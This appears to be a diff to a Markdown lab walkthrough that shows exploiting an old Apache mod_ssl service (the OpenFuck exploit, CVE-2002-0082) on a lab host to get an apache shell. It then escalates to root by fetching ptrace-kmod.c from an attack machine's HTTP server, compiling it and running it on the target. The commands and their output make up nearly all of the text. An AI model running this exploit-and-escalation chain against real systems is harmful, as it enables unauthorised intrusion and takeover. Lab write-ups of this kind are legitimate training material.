@@ -321,3 +321,122 @@ Finished
     uid=0(root) gid=0(root) groups=99(nobody)
     ```
 > Got direct reverse shell with root privileges
+
+### **Using Apache Service**
+* Search for the Apache service version in the exploitdb<br>
+```bash
+┌──(root㉿KALI)-[/home/hrishi]
+└─# searchsploit mod_ssl 2.8.4 
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                       | unix/remote/21671.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                 | unix/remote/764.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                 | unix/remote/47080.c
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+* Download OpenFuck exploit from the searchsploit database or download it from the the exploitdb website.
+  ```bash
+  ┌──(root㉿KALI)-[/home/hrishi/Desktop]
+  └─# searchsploit -m 47080
+  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
+      URL: https://www.exploit-db.com/exploits/47080
+     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
+    Codes: CVE-2002-0082, OSVDB-857
+  Verified: False
+  File Type: C source, ASCII text
+  Copied to: /home/hrishi/Desktop/47080.c
+  ```
+* Compile C file as shown below.
+  ```bash
+  ┌──(root㉿KALI)-[/home/hrishi/Desktop]
+  └─# gcc -Wall 47080.c -lcrypto -lssl -o exploit
+  ```
+* Run the compiled file as show below to get shell as apache
+  
+    ```bash
+    ──(root㉿KALI)-[/home/hrishi/Desktop]
+    └─# ./exploit 0x6b 192.168.153.129 -c 40 
+    *******************************************************************
+    * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+    *******************************************************************
+    * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+    * #hackarena  irc.brasnet.org                                     *
+    * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+    * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+    * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+    *******************************************************************
+    Connection... 40 of 40
+    Establishing SSL connection
+    cipher: 0x4043808c   ciphers: 0x80f8050
+    Ready to send shellcode
+    Spawning shell...
+    bash: no job control in this shell
+    bash-2.05$ 
+    d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
+    --02:37:57--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+            => `ptrace-kmod.c.1'
+    Connecting to dl.packetstormsecurity.net:443... connected!
+    Unable to establish SSL connection.
+    Unable to establish SSL connection.
+    gcc: file path prefix `/usr/bin' never used
+    [-] Unable to attach: Operation not permitted
+    bash: [1838: 1] tcsetattr: Invalid argument
+    bash-2.05$ 
+    bash-2.05$ id
+    id
+    uid=48(apache) gid=48(apache) groups=48(apache)
+    ```
+* To escalate the privileges to root download the file ```https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c``` in target host by hosting it in the attack machine and run the python server as shown below.
+    ```bash
+    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
+    └─# wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+    --2025-01-27 18:48:42--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+    Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
+    Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 3921 (3.8K) [text/x-csrc]
+    Saving to: ‘ptrace-kmod.c’
+    ptrace-kmod.c                   100%[====================================================>]   3.83K  --.-KB/s    in 0s      
+    2025-01-27 18:48:45 (91.1 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]
+    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
+    └─# python3 -m http.server 8080
+    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+    192.168.153.129 - - [27/Jan/2025 18:49:28] "GET /ptrace-kmod.c HTTP/1.0" 200 -
+    ```
+* Download the file in target machine and compile it as shown below.
+    ```bash
+    bash-2.05$ wget http://192.168.153.128:8080/ptrace-kmod.c
+    wget http://192.168.153.128:8080/ptrace-kmod.c
+    --02:53:10--  http://192.168.153.128:8080/ptrace-kmod.c
+            => `ptrace-kmod.c'
+    Connecting to 192.168.153.128:8080... connected!
+    HTTP request sent, awaiting response... 200 OK
+    Length: 3,921 [text/x-csrc]
+
+        0K ...                                                   100% @   3.74 MB/s
+
+    02:53:10 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+    bash-2.05$ gcc ptrace-kmod.c -o exploit
+    gcc ptrace-kmod.c -o exploit
+    ```
+* Run the compiled file as shown to get the root access
+    ```bash
+    bash-2.05$ ls
+    ls
+    exploit
+    ptrace-kmod.c
+    bash-2.05$ chmod +x exploit
+    chmod +x exploit
+    bash-2.05$ ./exploit
+    ./exploit
+    [+] Attached to 2036
+    [+] Waiting for signal
+    [+] Signal caught
+    [+] Shellcode placed at 0x4001189d
+    [+] Now wait for suid shell...
+    id
+    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+    ``` 
+
